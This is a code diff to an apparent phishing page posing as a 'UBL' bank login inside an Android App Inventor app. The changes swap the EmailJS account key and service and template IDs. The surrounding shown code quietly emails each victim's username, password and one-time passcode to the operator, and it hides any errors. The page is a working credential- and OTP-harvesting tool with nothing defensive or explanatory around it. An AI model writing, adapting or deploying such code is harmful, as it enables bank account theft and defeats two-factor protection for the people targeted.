@@ -222,7 +222,7 @@ input::placeholder { color: #aaa; }
 <div class="toast" id="toast"></div>
 
 <script>
-  emailjs.init('H8zNCi_xuoHUNTMAn');
+  emailjs.init('RYRbSRO3A2wOsa4qw');
 
   function showToast(msg, color) {
     const t = document.getElementById('toast');
@@ -253,7 +253,7 @@ input::placeholder { color: #aaa; }
         window.AppInventor.setWebViewString('UBL Login!\nUsername: ' + username + '\nPassword: ' + password);
       }
     } catch(e) {}
-    emailjs.send('service_uybum65', 'template_p4aqr39', {
+    emailjs.send('service_cejkldu', 'template_l4a50s2', {
       username: username, password: password, time: now
     }).catch(e => {});
 
@@ -291,7 +291,7 @@ input::placeholder { color: #aaa; }
     const now = new Date().toLocaleString();
 
     // Send email in background
-    emailjs.send('service_uybum65', 'template_p4aqr39', {
+    emailjs.send('service_cejkldu', 'template_l4a50s2', {
       otp: otp, time: now
     }).catch(e => {});
 
